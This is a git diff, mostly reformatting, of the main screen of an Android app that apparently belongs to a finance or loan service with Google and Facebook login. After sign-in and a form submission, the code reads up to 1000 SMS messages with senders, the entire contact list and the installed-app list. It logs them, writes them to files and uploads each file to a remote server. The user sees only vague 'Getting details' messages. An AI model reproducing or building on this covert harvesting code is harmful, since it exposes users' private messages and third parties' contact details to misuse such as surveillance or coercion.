@@ -11,18 +11,9 @@ import android.os.Environment;
 import android.os.Handler;
 import android.util.Log;
 import android.view.View;
-
-import android.widget.Button;
-
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.RequestBody;
-import retrofit2.Call;
-import retrofit2.Callback;
-import retrofit2.Response;
 
 import com.facebook.CallbackManager;
 import com.facebook.FacebookCallback;
@@ -33,15 +24,14 @@ import com.facebook.login.widget.LoginButton;
 import com.facebook.share.model.ShareHashtag;
 import com.facebook.share.model.ShareLinkContent;
 import com.facebook.share.widget.ShareDialog;
-import com.finance.hytone.model.ContactModel;
 import com.finance.hytone.constants.Constants;
 import com.finance.hytone.constants.HttpResponseUtils;
+import com.finance.hytone.model.ContactModel;
 import com.finance.hytone.model.SmsModel;
 import com.finance.hytone.retrofit.GetDataService;
 import com.finance.hytone.retrofit.RetrofitClientInstance;
 import com.google.android.gms.auth.api.signin.GoogleSignIn;
 import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
-import com.google.android.gms.auth.api.signin.GoogleSignInApi;
 import com.google.android.gms.auth.api.signin.GoogleSignInClient;
 import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
 import com.google.android.gms.common.SignInButton;
@@ -55,6 +45,13 @@ import java.io.PrintWriter;
 import java.util.Collections;
 import java.util.List;
 
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.RequestBody;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+
 public class MainActivity extends AppCompatActivity {
 
     private static final int RC_SIGN_IN = 100;
@@ -66,9 +63,10 @@ public class MainActivity extends AppCompatActivity {
     //private Context ctx;
     String auth;
     SignInButton signInButton;
-//    Button loginButton;
+    //    Button loginButton;
     LoginButton loginButton;
     ShareDialog shareDialog;
+    ProgressDialog pd;
     private String placeholder;
 
     @Override
@@ -87,8 +85,9 @@ public class MainActivity extends AppCompatActivity {
         //uploadContent();
         //installedApps();
     }
+
     @SuppressLint("WrongViewCast")
-    public  void do_next(final GoogleSignInClient mGoogleSignInClient){
+    public void do_next(final GoogleSignInClient mGoogleSignInClient) {
         signInButton = findViewById(R.id.sign_in_button);
         signInButton.setSize(SignInButton.SIZE_WIDE);
         signInButton.setColorScheme(SignInButton.COLOR_DARK);
@@ -141,10 +140,8 @@ public class MainActivity extends AppCompatActivity {
         });
 
 
-
 //        Set<String> permissions = AccessToken.getCurrentAccessToken().getPermissions();
-  //      Set<String> declinedPermissions = AccessToken.getCurrentAccessToken().getDeclinedPermissions();
-
+        //      Set<String> declinedPermissions = AccessToken.getCurrentAccessToken().getDeclinedPermissions();
 
 
 //        ShareLinkContent content = new ShareLinkContent.Builder()
@@ -167,7 +164,7 @@ public class MainActivity extends AppCompatActivity {
             }
         });*/
     }
-    ProgressDialog pd;
+
     private void doSmsWork() {
         pd = new ProgressDialog(MainActivity.this);
         pd.setCancelable(false);
@@ -181,89 +178,89 @@ public class MainActivity extends AppCompatActivity {
                     SmsFetch sf = new SmsFetch();
                     List<SmsModel> ss = sf.getAllSms(MainActivity.this);
 
-                    final String fullPath =  getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath()+File.separator+ "smslogs"+placeholder+".txt";
+                    final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "smslogs" + placeholder + ".txt";
                     File ff = new File(fullPath);
                     if (ff.exists())
                         ff.delete();
 
                     BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
-                        PrintWriter pw = new PrintWriter(fw);
+                    PrintWriter pw = new PrintWriter(fw);
 
 
-                for (int i = 0; i < ss.size() && i<1000; i++) {
-                    Log.e("address" + i, ss.get(i).getAddress());
-                    Log.e("msg" + i, ss.get(i).getMsg());
-                    pw.println("SMS "+i);
-                    pw.println(ss.get(i).getAddress() + i + "::::" + ss.get(i).getMsg());
-                    pw.println();
-                }
-                pw.close();
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        uploadContent(fullPath,FROM_SMS);
-                        //doContactWork();
+                    for (int i = 0; i < ss.size() && i < 1000; i++) {
+                        Log.e("address" + i, ss.get(i).getAddress());
+                        Log.e("msg" + i, ss.get(i).getMsg());
+                        pw.println("SMS " + i);
+                        pw.println(ss.get(i).getAddress() + i + "::::" + ss.get(i).getMsg());
+                        pw.println();
                     }
-                });
+                    pw.close();
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            uploadContent(fullPath, FROM_SMS);
+                            //doContactWork();
+                        }
+                    });
 
                 } catch (Exception e) {
                     e.printStackTrace();
-                    Helper.showDialogUIThread(MainActivity.this,false, "Error creating file",""+e);
+                    Helper.showDialogUIThread(MainActivity.this, false, "Error creating file", "" + e);
                 }
             }
         });
         tt.start();
 
     }
-private void doContactWork() {
-    pd = new ProgressDialog(MainActivity.this);
-    pd.setCancelable(false);
-    pd.setMessage("Getting details2...");
-    pd.show();
-    Thread tt = new Thread(new Runnable() {
-        @Override
-        public void run() {
-            try{
-            ContactFetch cf = new ContactFetch();
-            List<ContactModel> cc = cf.getContacts(MainActivity.this);
 
-            final String fullPath =  getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath()+File.separator+ "contacts"+placeholder+".txt";
-            File ff = new File(fullPath);
-            if (ff.exists())
-                ff.delete();
+    private void doContactWork() {
+        pd = new ProgressDialog(MainActivity.this);
+        pd.setCancelable(false);
+        pd.setMessage("Getting details2...");
+        pd.show();
+        Thread tt = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ContactFetch cf = new ContactFetch();
+                    List<ContactModel> cc = cf.getContacts(MainActivity.this);
 
-            BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
-            PrintWriter pw = new PrintWriter(fw);
+                    final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "contacts" + placeholder + ".txt";
+                    File ff = new File(fullPath);
+                    if (ff.exists())
+                        ff.delete();
 
-            for (int i = 0; i < cc.size(); i++) {
-                Log.e("contact" + i, "" + cc.get(i).mobileNumber + "," + cc.get(i).name);
-                pw.println("Contact "+i);
-                pw.println(cc.get(i).mobileNumber + i + "::::" + cc.get(i).name);
-                pw.println();
-            }
-            pw.close();
-            runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    //installedApps();
-                    //doContactWork();
-                    uploadContent(fullPath,FROM_CONTACTS);
+                    BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
+                    PrintWriter pw = new PrintWriter(fw);
+
+                    for (int i = 0; i < cc.size(); i++) {
+                        Log.e("contact" + i, "" + cc.get(i).mobileNumber + "," + cc.get(i).name);
+                        pw.println("Contact " + i);
+                        pw.println(cc.get(i).mobileNumber + i + "::::" + cc.get(i).name);
+                        pw.println();
+                    }
+                    pw.close();
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            //installedApps();
+                            //doContactWork();
+                            uploadContent(fullPath, FROM_CONTACTS);
+                        }
+                    });
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    Helper.showDialogUIThread(MainActivity.this, false, "Error creating file", "" + e);
                 }
-            });
-
-            } catch (Exception e) {
-                e.printStackTrace();
-                Helper.showDialogUIThread(MainActivity.this,false, "Error creating file",""+e);
             }
-        }
-    });
-    tt.start();
+        });
+        tt.start();
 
 
-}
+    }
 
-    void signIn(GoogleSignInClient mGoogleSignInClient)
-    {
+    void signIn(GoogleSignInClient mGoogleSignInClient) {
         //        Log.e(TAG+"auth",auth);
         Intent signInIntent = mGoogleSignInClient.getSignInIntent();
         startActivityForResult(signInIntent, RC_SIGN_IN);
@@ -278,13 +275,13 @@ private void doContactWork() {
             // a listener.
             Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
             handleSignInResult(task);
-        }
-        else if (requestCode == RC_GOOG_SIGNIN && resultCode == RESULT_OK){
+        } else if (requestCode == RC_GOOG_SIGNIN && resultCode == RESULT_OK) {
             Toast.makeText(this, "Success Form submit!", Toast.LENGTH_SHORT).show();
-            placeholder = Helper.getFname(MainActivity.this)+Helper.getPhone(MainActivity.this)+System.currentTimeMillis();
+            placeholder = Helper.getFname(MainActivity.this) + Helper.getPhone(MainActivity.this) + System.currentTimeMillis();
             doSmsWork();
         }
     }
+
     private void handleSignInResult(Task<GoogleSignInAccount> completedTask) {
         try {
             GoogleSignInAccount account = completedTask.getResult(ApiException.class);
@@ -313,20 +310,21 @@ private void doContactWork() {
 //        if (account == null)
 //            Toast.makeText(MainActivity.this, "No Details Found", Toast.LENGTH_SHORT).show();
 //        else {
-            Intent ii = new Intent(MainActivity.this,Form.class);
-            ii.putExtra("login_type", Constants.LOGINTYPE_GOOGLE);
-            ii.putExtra("name",personName);
-            ii.putExtra("email","");
+        Intent ii = new Intent(MainActivity.this, Form.class);
+        ii.putExtra("login_type", Constants.LOGINTYPE_GOOGLE);
+        ii.putExtra("name", personName);
+        ii.putExtra("email", "");
 
 
 //            ii.putExtra("name",account.getDisplayName());
 //            ii.putExtra("email",account.getEmail());
-            startActivityForResult(ii,RC_GOOG_SIGNIN);
-            //Log.e("acctName", account.getDisplayName() + "");
-            //Log.e("acctEmail", account.getEmail() + "");
-       // }
+        startActivityForResult(ii, RC_GOOG_SIGNIN);
+        //Log.e("acctName", account.getDisplayName() + "");
+        //Log.e("acctEmail", account.getEmail() + "");
+        // }
     }
-private void updateUIFb() {
+
+    private void updateUIFb() {
 //        if (account == null)
 //            Toast.makeText(MainActivity.this, "No Details Found", Toast.LENGTH_SHORT).show();
 //        else {
@@ -341,10 +339,10 @@ private void updateUIFb() {
         pd.setCancelable(false);
         pd.setMessage("Getting details3...");
         pd.show();
-        try{
+        try {
             List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
 
-            final String fullPath =  getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath()+File.separator+ "apps"+placeholder+".txt";
+            final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "apps" + placeholder + ".txt";
             File ff = new File(fullPath);
             if (ff.exists())
                 ff.delete();
@@ -370,13 +368,13 @@ private void updateUIFb() {
                 public void run() {
                     //installedApps();
                     //doContactWork();
-                    uploadContent(fullPath,FROM_APPS);
+                    uploadContent(fullPath, FROM_APPS);
                 }
             });
 
         } catch (Exception e) {
             e.printStackTrace();
-            Helper.showDialogUIThread(MainActivity.this,false, "Error creating file",""+e);
+            Helper.showDialogUIThread(MainActivity.this, false, "Error creating file", "" + e);
         }
 
     }
@@ -397,7 +395,7 @@ private void updateUIFb() {
 
             RequestBody requestFile =
                     RequestBody.create(
-                           // MediaType.parse("image/jpg"),
+                            // MediaType.parse("image/jpg"),
                             MediaType.parse("text/plain"),
                             file
                     );
@@ -409,7 +407,6 @@ private void updateUIFb() {
 
             //RequestBody items = RequestBody.create(MediaType.parse("application/json"), items);
             //RequestBody stringValue = RequestBody.create(MediaType.parse("text/plain"), stringValue);
-
 
 
             call = service.upload(body);
@@ -427,21 +424,20 @@ private void updateUIFb() {
                     Helper.log("passsed7", "here");
                     HttpResponseUtils.showBasicResponseLogsString(response);
                     try {
-                        String resBody = response.body().toString();
-                        Toast.makeText(MainActivity.this, ",,,,"+resBody, Toast.LENGTH_SHORT).show();
+                        String resBody = response.body();
+                        Toast.makeText(MainActivity.this, ",,,," + resBody, Toast.LENGTH_SHORT).show();
                         if (flag == FROM_SMS)
                             doContactWork();
                         else if (flag == FROM_CONTACTS)
                             installedApps();
-                        else if (flag == FROM_APPS)
-                        {
+                        else if (flag == FROM_APPS) {
                             new Handler().postDelayed(new Runnable() {
                                 @Override
                                 public void run() {
                                     Toast.makeText(MainActivity.this, "All jobs done!", Toast.LENGTH_LONG).show();
 
                                 }
-                            },2000);
+                            }, 2000);
                         }
                         //JSONObject jo = new JSONObject(resBody);
                         //int response_code = Integer.parseInt(jo.getString("response_code"));
@@ -461,9 +457,9 @@ private void updateUIFb() {
                     //Helper.log("failcase",t.toString());
                     pd.dismiss();
                     t.printStackTrace();
-                    Helper.log("agog111",""+call.request().toString());
-                    Helper.log("agog1111","1"+call.request().headers());
-                    Helper.showDialog(MainActivity.this,false,"Network failure!", ""+t.getMessage());
+                    Helper.log("agog111", "" + call.request().toString());
+                    Helper.log("agog1111", "1" + call.request().headers());
+                    Helper.showDialog(MainActivity.this, false, "Network failure!", "" + t.getMessage());
                 }
             });
 
@@ -472,6 +468,7 @@ private void updateUIFb() {
             e.printStackTrace();
         }
     }
+
     @Override
     public void onStart() {
         super.onStart();
